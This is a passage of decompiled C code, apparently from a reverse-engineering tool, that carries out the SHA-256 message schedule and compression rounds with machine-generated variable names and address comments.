                v103 = ((0x2000000 * v142 | v142 / 128) ^ (0x4000 * v141 | v141 / 0x40000) ^ v143 / 8) + v154 + v140 + ((0x2000 * v100 | v100 / 0x80000) ^ v100 / 1024 ^ (0x8000 * v100 | v100 / 0x20000));
                *(int32_t *)(v84 + 88) = v103;
                v183 = *(int32_t *)(4 * v61 + (int32_t)&g130);
                v104 = v103 + v35 + v183 + (v45 & (v41 ^ v39) ^ v39) + ((0x4000000 * v45 | v45 / 64) ^ (0x200000 * v45 | v45 / 2048) ^ (128 * v45 | v45 / 0x2000000));
                v85 = v59;
                v144 = *(int32_t *)(v85 + 28);
                v46 = v104 + v36;
                v47 = ((0x40000000 * v44 | v44 / 4) ^ (0x80000 * v44 | v44 / 0x2000) ^ (1024 * v44 | v44 / 0x400000)) + ((v44 | v42) & v40 | v44 & v42) + v104;
                v145 = *(int32_t *)(v85 + 32);
                v73 = v43;
                v48 = ((0x2000000 * v145 | v145 / 128) ^ v145 / 8 ^ (0x4000 * v145 | v145 / 0x40000)) + v144 + v91 + ((0x2000 * v73 | v73 / 0x80000) ^ v73 / 1024 ^ (0x8000 * v73 | v73 / 0x20000));
                *(int32_t *)(v85 + 92) = v48;
                v86 = v61;
                v184 = *(int32_t *)(4 * v86 + (int32_t)&g131);
                v49 = v48 + v39 + v184 + (v46 & (v45 ^ v41) ^ v41) + ((0x4000000 * v46 | v46 / 64) ^ (0x200000 * v46 | v46 / 2048) ^ (128 * v46 | v46 / 0x2000000));
                v7 = v86 + 8;
                v61 = v7;
                v8 = v59 + 32;
                v59 = v8;
                v105 = v49 + ((0x40000000 * v47 | v47 / 4) ^ (0x80000 * v47 | v47 / 0x2000) ^ (1024 * v47 | v47 / 0x400000)) + ((v47 | v44) & v42 | v47 & v44);
                // branch -> 0x80676b8
                while (v7 != 64) {
                    // 0x80676b8
                    v78 = v8;
                    v107 = v49 + v40;
                    v111 = v45;
                    v109 = v46;
                    v115 = v44;
                    v113 = v47;
                    v106 = v105;
                    v51 = (int32_t *)(v78 + 56);
                    v120 = *v51;
                    v121 = *v51;
                    v122 = *(int32_t *)(v78 + 4);
                    v74 = *(int32_t *)v78;
                    v123 = *v51;
                    v148 = *(int32_t *)(v78 + 36);
                    v90 = v148 + v74 + (v123 / 1024 ^ (0x8000 * v121 | v121 / 0x20000) ^ (0x2000 * v120 | v120 / 0x80000)) + ((0x2000000 * v122 | v122 / 128) ^ v122 / 8 ^ (0x4000 * v122 | v122 / 0x40000));
                    v163 = *(int32_t *)(4 * v7 + (int32_t)&SHA256_Hash_constant_words_K__0x428a2f98__at_807c200);
                    *(int32_t *)(v78 + 64) = v90;
                    v91 = v90;
                    v92 = ((0x4000000 * v107 | v107 / 64) ^ (0x200000 * v107 | v107 / 2048) ^ (128 * v107 | v107 / 0x2000000)) + v41 + ((v109 ^ v111) & v107 ^ v111) + v163 + v91;
                    v32 = v92 + v42;
                    v79 = v59;
                    v52 = (int32_t *)(v79 + 60);
                    v124 = *v52;
                    v93 = v92 + ((0x40000000 * v106 | v106 / 4) ^ (0x80000 * v106 | v106 / 0x2000) ^ (1024 * v106 | v106 / 0x400000)) + ((v106 | v113) & v115 | v106 & v113);
                    v125 = *v52;
                    v126 = *(int32_t *)(v79 + 8);
                    v149 = *(int32_t *)(v79 + 40);
                    v127 = *v52;
                    v94 = (v127 / 1024 ^ (0x2000 * v125 | v125 / 0x80000) ^ (0x8000 * v124 | v124 / 0x20000)) + v149 + v122 + ((0x2000000 * v126 | v126 / 128) ^ v126 / 8 ^ (0x4000 * v126 | v126 / 0x40000));
                    v164 = *(int32_t *)(4 * v61 + (int32_t)&g125);
                    *(int32_t *)(v79 + 68) = v94;
                    v95 = (v32 & (v109 ^ v107) ^ v109) + v111 + v164 + ((0x4000000 * v32 | v32 / 64) ^ (0x200000 * v32 | v32 / 2048) ^ (128 * v32 | v32 / 0x2000000)) + v94;
                    v33 = v95 + v115;
                    v34 = ((0x40000000 * v93 | v93 / 4) ^ (0x80000 * v93 | v93 / 0x2000) ^ (1024 * v93 | v93 / 0x400000)) + ((v93 | v106) & v113 | v93 & v106) + v95;
                    v80 = v59;
                    v128 = *(int32_t *)(v80 + 12);
                    v150 = *(int32_t *)(v80 + 44);
                    v165 = *(int32_t *)(4 * v61 + (int32_t)&g126);
                    v96 = ((0x2000000 * v128 | v128 / 128) ^ v128 / 8 ^ (0x4000 * v128 | v128 / 0x40000)) + v126 + ((0x2000 * v91 | v91 / 0x80000) ^ v91 / 1024 ^ (0x8000 * v91 | v91 / 0x20000)) + v150;
                    *(int32_t *)(v80 + 72) = v96;
                    v97 = v96;
                    v98 = v165 + v109 + v97 + (v33 & (v32 ^ v107) ^ v107) + ((0x4000000 * v33 | v33 / 64) ^ (0x200000 * v33 | v33 / 2048) ^ (128 * v33 | v33 / 0x2000000));
                    v166 = *(int32_t *)(4 * v61 + (int32_t)&g127);
                    v35 = v98 + v113;
                    v36 = ((0x40000000 * v34 | v34 / 4) ^ (0x80000 * v34 | v34 / 0x2000) ^ (1024 * v34 | v34 / 0x400000)) + ((v34 | v93) & v106 | v34 & v93) + v98;
                    v81 = v59;
                    v151 = *(int32_t *)(v81 + 48);
                    v53 = (int32_t *)(v81 + 16);
                    v129 = *v53;
                    v130 = *v53;
                    v131 = *v53;
                    v37 = ((0x2000000 * v130 | v130 / 128) ^ (0x4000 * v129 | v129 / 0x40000) ^ v131 / 8) + v151 + v128 + ((0x2000 * v94 | v94 / 0x80000) ^ v94 / 1024 ^ (0x8000 * v94 | v94 / 0x20000));
                    *(int32_t *)(v81 + 76) = v37;
                    v38 = v166 + v107 + (v35 & (v33 ^ v32) ^ v32) + ((0x4000000 * v35 | v35 / 64) ^ (0x200000 * v35 | v35 / 2048) ^ (128 * v35 | v35 / 0x2000000)) + v37;
                    v39 = v38 + v106;
                    v40 = ((0x40000000 * v36 | v36 / 4) ^ (0x80000 * v36 | v36 / 0x2000) ^ (1024 * v36 | v36 / 0x400000)) + ((v36 | v34) & v93 | v36 & v34) + v38;
                    v82 = v59;
                    v132 = *(int32_t *)(v82 + 16);
                    v152 = *(int32_t *)(v82 + 52);
                    v54 = (int32_t *)(v82 + 20);
                    v133 = *v54;
                    v134 = *v54;
                    v135 = *v54;
                    v99 = ((0x2000000 * v134 | v134 / 128) ^ (0x4000 * v133 | v133 / 0x40000) ^ v135 / 8) + v152 + v132 + ((0x2000 * v97 | v97 / 0x80000) ^ v97 / 1024 ^ (0x8000 * v97 | v97 / 0x20000));
                    v167 = *(int32_t *)(4 * v61 + (int32_t)&g128);
                    *(int32_t *)(v82 + 80) = v99;
                    v100 = v99;
                    v101 = v167 + v32 + v100 + (v39 & (v35 ^ v33) ^ v33) + ((0x4000000 * v39 | v39 / 64) ^ (0x200000 * v39 | v39 / 2048) ^ (128 * v39 | v39 / 0x2000000));
                    v41 = v101 + v93;
                    v72 = v37;
                    v42 = ((0x40000000 * v40 | v40 / 4) ^ (0x80000 * v40 | v40 / 0x2000) ^ (1024 * v40 | v40 / 0x400000)) + ((v40 | v36) & v34 | v40 & v36) + v101;
                    v83 = v59;
                    v136 = *(int32_t *)(v83 + 20);
                    v153 = *(int32_t *)(v83 + 56);
                    v55 = (int32_t *)(v83 + 24);
                    v137 = *v55;
                    v138 = *v55;
                    v139 = *v55;
                    v43 = ((0x2000000 * v138 | v138 / 128) ^ (0x4000 * v137 | v137 / 0x40000) ^ v139 / 8) + ((0x2000 * v72 | v72 / 0x80000) ^ (0x8000 * v72 | v72 / 0x20000) ^ v72 / 1024) + v153 + v136;
                    v168 = *(int32_t *)(4 * v61 + (int32_t)&g129);
                    *(int32_t *)(v83 + 84) = v43;
                    v102 = (v41 & (v39 ^ v35) ^ v35) + v33 + v168 + ((0x4000000 * v41 | v41 / 64) ^ (0x200000 * v41 | v41 / 2048) ^ (128 * v41 | v41 / 0x2000000)) + v43;
                    v44 = ((0x40000000 * v42 | v42 / 4) ^ (0x80000 * v42 | v42 / 0x2000) ^ (1024 * v42 | v42 / 0x400000)) + ((v42 | v40) & v36 | v42 & v40) + v102;
                    v45 = v102 + v34;
                    v84 = v59;
                    v140 = *(int32_t *)(v84 + 24);
                    v154 = *(int32_t *)(v84 + 60);
                    v56 = (int32_t *)(v84 + 28);
                    v141 = *v56;
                    v142 = *v56;
                    v143 = *v56;
                    v103 = ((0x2000000 * v142 | v142 / 128) ^ (0x4000 * v141 | v141 / 0x40000) ^ v143 / 8) + v154 + v140 + ((0x2000 * v100 | v100 / 0x80000) ^ v100 / 1024 ^ (0x8000 * v100 | v100 / 0x20000));
                    *(int32_t *)(v84 + 88) = v103;
                    v183 = *(int32_t *)(4 * v61 + (int32_t)&g130);
                    v104 = v103 + v35 + v183 + (v45 & (v41 ^ v39) ^ v39) + ((0x4000000 * v45 | v45 / 64) ^ (0x200000 * v45 | v45 / 2048) ^ (128 * v45 | v45 / 0x2000000));
                    v85 = v59;
                    v144 = *(int32_t *)(v85 + 28);
                    v46 = v104 + v36;
                    v47 = ((0x40000000 * v44 | v44 / 4) ^ (0x80000 * v44 | v44 / 0x2000) ^ (1024 * v44 | v44 / 0x400000)) + ((v44 | v42) & v40 | v44 & v42) + v104;
                    v145 = *(int32_t *)(v85 + 32);
                    v73 = v43;
                    v48 = ((0x2000000 * v145 | v145 / 128) ^ v145 / 8 ^ (0x4000 * v145 | v145 / 0x40000)) + v144 + v91 + ((0x2000 * v73 | v73 / 0x80000) ^ v73 / 1024 ^ (0x8000 * v73 | v73 / 0x20000));
                    *(int32_t *)(v85 + 92) = v48;
                    v86 = v61;
                    v184 = *(int32_t *)(4 * v86 + (int32_t)&g131);
                    v49 = v48 + v39 + v184 + (v46 & (v45 ^ v41) ^ v41) + ((0x4000000 * v46 | v46 / 64) ^ (0x200000 * v46 | v46 / 2048) ^ (128 * v46 | v46 / 0x2000000));
                    v7 = v86 + 8;
                    v61 = v7;
                    v8 = v59 + 32;
                    v59 = v8;
                    v105 = v49 + ((0x40000000 * v47 | v47 / 4) ^ (0x80000 * v47 | v47 / 0x2000) ^ (1024 * v47 | v47 / 0x400000)) + ((v47 | v44) & v42 | v47 & v44);
                    // continue -> 0x80676b8
                }
                // 0x8067e33
                v146 = a1;
                v58 = (int32_t *)(v146 + 8);
                *v58 = *v58 + v105;
                v10 = 1;
                if (v10 == 8) {
                    // 0x8067e90
                    g3 = v3;
                    return 8;
                }
                v155 = 4 * v10;
                v57 = (int32_t *)(v146 + 8 + v155);
                *v57 = *v57 + *(int32_t *)(v155 - 44 + v2);
                v9 = v10 + 1;
                while (v9 != 8) {
                    // 0x8067e80
                    v155 = 4 * v9;
                    v57 = (int32_t *)(v146 + 8 + v155);
                    *v57 = *v57 + *(int32_t *)(v155 - 44 + v2);
                    v9++;
                    // continue -> 0x8067e80
                }
                // 0x8067e90
                g3 = v3;
                return 8;
            }
          lab_0x8067090:
            // 0x8067090
            v188 = v59;
            v189 = v5;
            // branch -> 0x8067090
        }
    }
    // 0x8067088
    v50 = &v65;
    v59 = v50;
    // branch -> 0x8067090
    while (true) {
        // 0x8067090
        v75 = a2;
        v156 = 0;
        v118 = *(char *)(v156 + v75);
        v159 = *(char *)(v75 + 1 + v156);
        v160 = *(char *)(v75 + 3 + v156);
        v161 = *(char *)(v75 + 2 + v156);
        *(int32_t *)(v156 + v50) = 256 * (int32_t)v161 | 0x10000 * (int32_t)v159 | 0x1000000 * (int32_t)v118 | (int32_t)v160;
        v5 = 1;
        v60 = v5;
        if (v5 != 16) {
            goto lab_0x8067090;
        }
        // 0x80670bd
        v61 = 0;
        v71 = v70;
        v108 = v66;
        v112 = v63;
        v110 = v64;
        v116 = v68;
        v114 = v69;
        v119 = 0;
        v162 = *(int32_t *)(v119 + (int32_t)&SHA256_Hash_constant_words_K__0x428a2f98__at_807c200);
        v76 = v59;
        v147 = *(int32_t *)(v76 + v119);
        v87 = ((0x4000000 * v108 | v108 / 64) ^ (0x200000 * v108 | v108 / 2048) ^ (128 * v108 | v108 / 0x2000000)) + v62 + ((v110 ^ v112) & v108 ^ v112) + v162 + v147;
        v11 = v87 + v67;
        v169 = *(int32_t *)(v119 + 4 + v76);
        v170 = *(int32_t *)(v119 + (int32_t)&g125);
        v12 = v87 + ((v114 | v71) & v116 | v114 & v71) + ((0x80000 * v71 | v71 / 0x2000) ^ (0x40000000 * v71 | v71 / 4) ^ (1024 * v71 | v71 / 0x400000));
        v13 = v170 + v169 + v112 + (v11 & (v110 ^ v108) ^ v110) + ((0x4000000 * v11 | v11 / 64) ^ (0x200000 * v11 | v11 / 2048) ^ (128 * v11 | v11 / 0x2000000));
        v14 = v13 + v116;
        v15 = ((0x80000 * v12 | v12 / 0x2000) ^ (0x40000000 * v12 | v12 / 4) ^ (1024 * v12 | v12 / 0x400000)) + ((v12 | v71) & v114 | v12 & v71) + v13;
        v157 = 4 * v61;
        v171 = *(int32_t *)(v76 + 8 + v157);
        v172 = *(int32_t *)(v157 + (int32_t)&g126);
        v16 = v172 + v171 + v110 + (v14 & (v11 ^ v108) ^ v108) + ((0x4000000 * v14 | v14 / 64) ^ (0x200000 * v14 | v14 / 2048) ^ (128 * v14 | v14 / 0x2000000));
        v17 = v16 + v114;
        v18 = ((0x40000000 * v15 | v15 / 4) ^ (0x80000 * v15 | v15 / 0x2000) ^ (1024 * v15 | v15 / 0x400000)) + ((v15 | v12) & v71 | v15 & v12) + v16;
        v173 = *(int32_t *)(v76 + 12 + v157);
        v174 = *(int32_t *)(v157 + (int32_t)&g127);
        v19 = v174 + v173 + v108 + (v17 & (v14 ^ v11) ^ v11) + ((0x4000000 * v17 | v17 / 64) ^ (0x200000 * v17 | v17 / 2048) ^ (128 * v17 | v17 / 0x2000000));
        v20 = v19 + v70;
        v21 = ((0x40000000 * v18 | v18 / 4) ^ (0x80000 * v18 | v18 / 0x2000) ^ (1024 * v18 | v18 / 0x400000)) + ((v18 | v15) & v12 | v18 & v15) + v19;
        v77 = v59;
        v175 = *(int32_t *)(v77 + 16 + v157);
        v176 = *(int32_t *)(v157 + (int32_t)&g128);
        v22 = v176 + v175 + v11 + (v20 & (v17 ^ v14) ^ v14) + ((0x4000000 * v20 | v20 / 64) ^ (0x200000 * v20 | v20 / 2048) ^ (128 * v20 | v20 / 0x2000000));
        v23 = v22 + v12;
        v177 = *(int32_t *)(v77 + 20 + v157);
        v178 = *(int32_t *)(v157 + (int32_t)&g129);
        v24 = v22 + ((0x40000000 * v21 | v21 / 4) ^ (0x80000 * v21 | v21 / 0x2000) ^ (1024 * v21 | v21 / 0x400000)) + ((v21 | v18) & v15 | v21 & v18);
        v25 = v178 + v177 + v14 + (v23 & (v20 ^ v17) ^ v17) + ((0x4000000 * v23 | v23 / 64) ^ (0x200000 * v23 | v23 / 2048) ^ (128 * v23 | v23 / 0x2000000));
        v26 = v25 + v15;
        v27 = ((0x80000 * v24 | v24 / 0x2000) ^ (0x40000000 * v24 | v24 / 4) ^ (1024 * v24 | v24 / 0x400000)) + ((v24 | v21) & v18 | v24 & v21) + v25;
        v117 = v61;
        v158 = 4 * v117;
        v179 = *(int32_t *)(v77 + 24 + v158);
        v180 = *(int32_t *)(v158 + (int32_t)&g130);
        v181 = *(int32_t *)(v77 + 28 + v158);
        v182 = *(int32_t *)(v158 + (int32_t)&g131);
        v28 = v180 + v179 + v17 + (v26 & (v23 ^ v20) ^ v20) + ((0x4000000 * v26 | v26 / 64) ^ (0x200000 * v26 | v26 / 2048) ^ (128 * v26 | v26 / 0x2000000));
        v29 = ((0x40000000 * v27 | v27 / 4) ^ (0x80000 * v27 | v27 / 0x2000) ^ (1024 * v27 | v27 / 0x400000)) + ((v27 | v24) & v21 | v27 & v24) + v28;
        v30 = v28 + v18;
        v6 = v117 + 8;
        v61 = v6;
        v88 = v182 + v181 + v20 + (v30 & (v26 ^ v23) ^ v23) + ((0x4000000 * v30 | v30 / 64) ^ (0x200000 * v30 | v30 / 2048) ^ (128 * v30 | v30 / 0x2000000));
        v31 = v88 + v21;
        v89 = v88 + ((0x40000000 * v29 | v29 / 4) ^ (0x80000 * v29 | v29 / 0x2000) ^ (1024 * v29 | v29 / 0x400000)) + ((v29 | v27) & v24 | v29 & v27);
        // branch -> 0x80670fb
        while (v6 != 16) {
            // 0x80670fb
            v71 = v89;
            v108 = v31;
            v112 = v26;
            v110 = v30;
            v116 = v27;
            v114 = v29;
            v119 = 4 * v6;
            v162 = *(int32_t *)(v119 + (int32_t)&SHA256_Hash_constant_words_K__0x428a2f98__at_807c200);
            v76 = v59;
            v147 = *(int32_t *)(v76 + v119);
            v87 = ((0x4000000 * v108 | v108 / 64) ^ (0x200000 * v108 | v108 / 2048) ^ (128 * v108 | v108 / 0x2000000)) + v23 + ((v110 ^ v112) & v108 ^ v112) + v162 + v147;
            v11 = v87 + v24;
            v169 = *(int32_t *)(v119 + 4 + v76);
            v170 = *(int32_t *)(v119 + (int32_t)&g125);
            v12 = v87 + ((v114 | v71) & v116 | v114 & v71) + ((0x80000 * v71 | v71 / 0x2000) ^ (0x40000000 * v71 | v71 / 4) ^ (1024 * v71 | v71 / 0x400000));
            v13 = v170 + v169 + v112 + (v11 & (v110 ^ v108) ^ v110) + ((0x4000000 * v11 | v11 / 64) ^ (0x200000 * v11 | v11 / 2048) ^ (128 * v11 | v11 / 0x2000000));
            v14 = v13 + v116;
            v15 = ((0x80000 * v12 | v12 / 0x2000) ^ (0x40000000 * v12 | v12 / 4) ^ (1024 * v12 | v12 / 0x400000)) + ((v12 | v71) & v114 | v12 & v71) + v13;
            v157 = 4 * v61;
            v171 = *(int32_t *)(v76 + 8 + v157);
            v172 = *(int32_t *)(v157 + (int32_t)&g126);
            v16 = v172 + v171 + v110 + (v14 & (v11 ^ v108) ^ v108) + ((0x4000000 * v14 | v14 / 64) ^ (0x200000 * v14 | v14 / 2048) ^ (128 * v14 | v14 / 0x2000000));
            v17 = v16 + v114;
            v18 = ((0x40000000 * v15 | v15 / 4) ^ (0x80000 * v15 | v15 / 0x2000) ^ (1024 * v15 | v15 / 0x400000)) + ((v15 | v12) & v71 | v15 & v12) + v16;
            v173 = *(int32_t *)(v76 + 12 + v157);
            v174 = *(int32_t *)(v157 + (int32_t)&g127);
            v19 = v174 + v173 + v108 + (v17 & (v14 ^ v11) ^ v11) + ((0x4000000 * v17 | v17 / 64) ^ (0x200000 * v17 | v17 / 2048) ^ (128 * v17 | v17 / 0x2000000));
            v20 = v19 + v89;
            v21 = ((0x40000000 * v18 | v18 / 4) ^ (0x80000 * v18 | v18 / 0x2000) ^ (1024 * v18 | v18 / 0x400000)) + ((v18 | v15) & v12 | v18 & v15) + v19;
            v77 = v59;
            v175 = *(int32_t *)(v77 + 16 + v157);
            v176 = *(int32_t *)(v157 + (int32_t)&g128);
            v22 = v176 + v175 + v11 + (v20 & (v17 ^ v14) ^ v14) + ((0x4000000 * v20 | v20 / 64) ^ (0x200000 * v20 | v20 / 2048) ^ (128 * v20 | v20 / 0x2000000));
            v23 = v22 + v12;
            v177 = *(int32_t *)(v77 + 20 + v157);
            v178 = *(int32_t *)(v157 + (int32_t)&g129);
            v24 = v22 + ((0x40000000 * v21 | v21 / 4) ^ (0x80000 * v21 | v21 / 0x2000) ^ (1024 * v21 | v21 / 0x400000)) + ((v21 | v18) & v15 | v21 & v18);
            v25 = v178 + v177 + v14 + (v23 & (v20 ^ v17) ^ v17) + ((0x4000000 * v23 | v23 / 64) ^ (0x200000 * v23 | v23 / 2048) ^ (128 * v23 | v23 / 0x2000000));
            v26 = v25 + v15;
            v27 = ((0x80000 * v24 | v24 / 0x2000) ^ (0x40000000 * v24 | v24 / 4) ^ (1024 * v24 | v24 / 0x400000)) + ((v24 | v21) & v18 | v24 & v21) + v25;
            v117 = v61;
            v158 = 4 * v117;
            v179 = *(int32_t *)(v77 + 24 + v158);
            v180 = *(int32_t *)(v158 + (int32_t)&g130);
            v181 = *(int32_t *)(v77 + 28 + v158);
            v182 = *(int32_t *)(v158 + (int32_t)&g131);
            v28 = v180 + v179 + v17 + (v26 & (v23 ^ v20) ^ v20) + ((0x4000000 * v26 | v26 / 64) ^ (0x200000 * v26 | v26 / 2048) ^ (128 * v26 | v26 / 0x2000000));
            v29 = ((0x40000000 * v27 | v27 / 4) ^ (0x80000 * v27 | v27 / 0x2000) ^ (1024 * v27 | v27 / 0x400000)) + ((v27 | v24) & v21 | v27 & v24) + v28;
            v30 = v28 + v18;
            v6 = v117 + 8;
            v61 = v6;
            v88 = v182 + v181 + v20 + (v30 & (v26 ^ v23) ^ v23) + ((0x4000000 * v30 | v30 / 64) ^ (0x200000 * v30 | v30 / 2048) ^ (128 * v30 | v30 / 0x2000000));
            v31 = v88 + v21;
            v89 = v88 + ((0x40000000 * v29 | v29 / 4) ^ (0x80000 * v29 | v29 / 0x2000) ^ (1024 * v29 | v29 / 0x400000)) + ((v29 | v27) & v24 | v29 & v27);
            // continue -> 0x80670fb
        }
        // 0x806766d
        v78 = v59;
        v107 = v31;
        v111 = v26;
        v109 = v30;
        v115 = v27;
        v113 = v29;
        v106 = v89;
        v51 = (int32_t *)(v78 + 56);
        v120 = *v51;
        v121 = *v51;
        v122 = *(int32_t *)(v78 + 4);
        v74 = *(int32_t *)v78;
        v123 = *v51;
        v148 = *(int32_t *)(v78 + 36);
        v90 = v148 + v74 + (v123 / 1024 ^ (0x8000 * v121 | v121 / 0x20000) ^ (0x2000 * v120 | v120 / 0x80000)) + ((0x2000000 * v122 | v122 / 128) ^ v122 / 8 ^ (0x4000 * v122 | v122 / 0x40000));
        v163 = *(int32_t *)(64 + (int32_t)&SHA256_Hash_constant_words_K__0x428a2f98__at_807c200);
        *(int32_t *)(v78 + 64) = v90;
        v91 = v90;
        v92 = ((0x4000000 * v107 | v107 / 64) ^ (0x200000 * v107 | v107 / 2048) ^ (128 * v107 | v107 / 0x2000000)) + v23 + ((v109 ^ v111) & v107 ^ v111) + v163 + v91;
        v32 = v92 + v24;
        v79 = v59;
        v52 = (int32_t *)(v79 + 60);
        v124 = *v52;
        v93 = v92 + ((0x40000000 * v106 | v106 / 4) ^ (0x80000 * v106 | v106 / 0x2000) ^ (1024 * v106 | v106 / 0x400000)) + ((v106 | v113) & v115 | v106 & v113);
        v125 = *v52;
        v126 = *(int32_t *)(v79 + 8);
        v149 = *(int32_t *)(v79 + 40);
        v127 = *v52;
        v94 = (v127 / 1024 ^ (0x2000 * v125 | v125 / 0x80000) ^ (0x8000 * v124 | v124 / 0x20000)) + v149 + v122 + ((0x2000000 * v126 | v126 / 128) ^ v126 / 8 ^ (0x4000 * v126 | v126 / 0x40000));
        v164 = *(int32_t *)(4 * v61 + (int32_t)&g125);
        *(int32_t *)(v79 + 68) = v94;
        v95 = (v32 & (v109 ^ v107) ^ v109) + v111 + v164 + ((0x4000000 * v32 | v32 / 64) ^ (0x200000 * v32 | v32 / 2048) ^ (128 * v32 | v32 / 0x2000000)) + v94;
        v33 = v95 + v115;
        v34 = ((0x40000000 * v93 | v93 / 4) ^ (0x80000 * v93 | v93 / 0x2000) ^ (1024 * v93 | v93 / 0x400000)) + ((v93 | v106) & v113 | v93 & v106) + v95;
        v80 = v59;
        v128 = *(int32_t *)(v80 + 12);
        v150 = *(int32_t *)(v80 + 44);
        v165 = *(int32_t *)(4 * v61 + (int32_t)&g126);
        v96 = ((0x2000000 * v128 | v128 / 128) ^ v128 / 8 ^ (0x4000 * v128 | v128 / 0x40000)) + v126 + ((0x2000 * v91 | v91 / 0x80000) ^ v91 / 1024 ^ (0x8000 * v91 | v91 / 0x20000)) + v150;
        *(int32_t *)(v80 + 72) = v96;
        v97 = v96;
        v98 = v165 + v109 + v97 + (v33 & (v32 ^ v107) ^ v107) + ((0x4000000 * v33 | v33 / 64) ^ (0x200000 * v33 | v33 / 2048) ^ (128 * v33 | v33 / 0x2000000));
        v166 = *(int32_t *)(4 * v61 + (int32_t)&g127);
        v35 = v98 + v113;
        v36 = ((0x40000000 * v34 | v34 / 4) ^ (0x80000 * v34 | v34 / 0x2000) ^ (1024 * v34 | v34 / 0x400000)) + ((v34 | v93) & v106 | v34 & v93) + v98;
        v81 = v59;
        v151 = *(int32_t *)(v81 + 48);
        v53 = (int32_t *)(v81 + 16);
        v129 = *v53;
        v130 = *v53;
        v131 = *v53;
        v37 = ((0x2000000 * v130 | v130 / 128) ^ (0x4000 * v129 | v129 / 0x40000) ^ v131 / 8) + v151 + v128 + ((0x2000 * v94 | v94 / 0x80000) ^ v94 / 1024 ^ (0x8000 * v94 | v94 / 0x20000));
        *(int32_t *)(v81 + 76) = v37;
        v38 = v166 + v107 + (v35 & (v33 ^ v32) ^ v32) + ((0x4000000 * v35 | v35 / 64) ^ (0x200000 * v35 | v35 / 2048) ^ (128 * v35 | v35 / 0x2000000)) + v37;
        v39 = v38 + v106;
        v40 = ((0x40000000 * v36 | v36 / 4) ^ (0x80000 * v36 | v36 / 0x2000) ^ (1024 * v36 | v36 / 0x400000)) + ((v36 | v34) & v93 | v36 & v34) + v38;
        v82 = v59;
        v132 = *(int32_t *)(v82 + 16);
        v152 = *(int32_t *)(v82 + 52);
        v54 = (int32_t *)(v82 + 20);
        v133 = *v54;
        v134 = *v54;
        v135 = *v54;
        v99 = ((0x2000000 * v134 | v134 / 128) ^ (0x4000 * v133 | v133 / 0x40000) ^ v135 / 8) + v152 + v132 + ((0x2000 * v97 | v97 / 0x80000) ^ v97 / 1024 ^ (0x8000 * v97 | v97 / 0x20000));
        v167 = *(int32_t *)(4 * v61 + (int32_t)&g128);
        *(int32_t *)(v82 + 80) = v99;
        v100 = v99;
        v101 = v167 + v32 + v100 + (v39 & (v35 ^ v33) ^ v33) + ((0x4000000 * v39 | v39 / 64) ^ (0x200000 * v39 | v39 / 2048) ^ (128 * v39 | v39 / 0x2000000));
        v41 = v101 + v93;
        v72 = v37;
        v42 = ((0x40000000 * v40 | v40 / 4) ^ (0x80000 * v40 | v40 / 0x2000) ^ (1024 * v40 | v40 / 0x400000)) + ((v40 | v36) & v34 | v40 & v36) + v101;
        v83 = v59;
        v136 = *(int32_t *)(v83 + 20);
        v153 = *(int32_t *)(v83 + 56);
        v55 = (int32_t *)(v83 + 24);
        v137 = *v55;
        v138 = *v55;
        v139 = *v55;
        v43 = ((0x2000000 * v138 | v138 / 128) ^ (0x4000 * v137 | v137 / 0x40000) ^ v139 / 8) + ((0x2000 * v72 | v72 / 0x80000) ^ (0x8000 * v72 | v72 / 0x20000) ^ v72 / 1024) + v153 + v136;
        v168 = *(int32_t *)(4 * v61 + (int32_t)&g129);
        *(int32_t *)(v83 + 84) = v43;
        v102 = (v41 & (v39 ^ v35) ^ v35) + v33 + v168 + ((0x4000000 * v41 | v41 / 64) ^ (0x200000 * v41 | v41 / 2048) ^ (128 * v41 | v41 / 0x2000000)) + v43;
        v44 = ((0x40000000 * v42 | v42 / 4) ^ (0x80000 * v42 | v42 / 0x2000) ^ (1024 * v42 | v42 / 0x400000)) + ((v42 | v40) & v36 | v42 & v40) + v102;
        v45 = v102 + v34;
        v84 = v59;
        v140 = *(int32_t *)(v84 + 24);
        v154 = *(int32_t *)(v84 + 60);
        v56 = (int32_t *)(v84 + 28);
        v141 = *v56;
        v142 = *v56;
        v143 = *v56;
        v103 = ((0x2000000 * v142 | v142 / 128) ^ (0x4000 * v141 | v141 / 0x40000) ^ v143 / 8) + v154 + v140 + ((0x2000 * v100 | v100 / 0x80000) ^ v100 / 1024 ^ (0x8000 * v100 | v100 / 0x20000));
        *(int32_t *)(v84 + 88) = v103;
        v183 = *(int32_t *)(4 * v61 + (int32_t)&g130);
        v104 = v103 + v35 + v183 + (v45 & (v41 ^ v39) ^ v39) + ((0x4000000 * v45 | v45 / 64) ^ (0x200000 * v45 | v45 / 2048) ^ (128 * v45 | v45 / 0x2000000));
        v85 = v59;
        v144 = *(int32_t *)(v85 + 28);
        v46 = v104 + v36;
        v47 = ((0x40000000 * v44 | v44 / 4) ^ (0x80000 * v44 | v44 / 0x2000) ^ (1024 * v44 | v44 / 0x400000)) + ((v44 | v42) & v40 | v44 & v42) + v104;
        v145 = *(int32_t *)(v85 + 32);
        v73 = v43;
        v48 = ((0x2000000 * v145 | v145 / 128) ^ v145 / 8 ^ (0x4000 * v145 | v145 / 0x40000)) + v144 + v91 + ((0x2000 * v73 | v73 / 0x80000) ^ v73 / 1024 ^ (0x8000 * v73 | v73 / 0x20000));
        *(int32_t *)(v85 + 92) = v48;
        v86 = v61;
        v184 = *(int32_t *)(4 * v86 + (int32_t)&g131);
        v49 = v48 + v39 + v184 + (v46 & (v45 ^ v41) ^ v41) + ((0x4000000 * v46 | v46 / 64) ^ (0x200000 * v46 | v46 / 2048) ^ (128 * v46 | v46 / 0x2000000));
        v7 = v86 + 8;
        v61 = v7;
        v8 = v59 + 32;
        v59 = v8;
        v105 = v49 + ((0x40000000 * v47 | v47 / 4) ^ (0x80000 * v47 | v47 / 0x2000) ^ (1024 * v47 | v47 / 0x400000)) + ((v47 | v44) & v42 | v47 & v44);
        // branch -> 0x80676b8
        while (v7 != 64) {
            // 0x80676b8
            v78 = v8;
            v107 = v49 + v40;
            v111 = v45;
            v109 = v46;
            v115 = v44;
            v113 = v47;
            v106 = v105;
            v51 = (int32_t *)(v78 + 56);
            v120 = *v51;
            v121 = *v51;
            v122 = *(int32_t *)(v78 + 4);
            v74 = *(int32_t *)v78;
            v123 = *v51;
            v148 = *(int32_t *)(v78 + 36);
            v90 = v148 + v74 + (v123 / 1024 ^ (0x8000 * v121 | v121 / 0x20000) ^ (0x2000 * v120 | v120 / 0x80000)) + ((0x2000000 * v122 | v122 / 128) ^ v122 / 8 ^ (0x4000 * v122 | v122 / 0x40000));
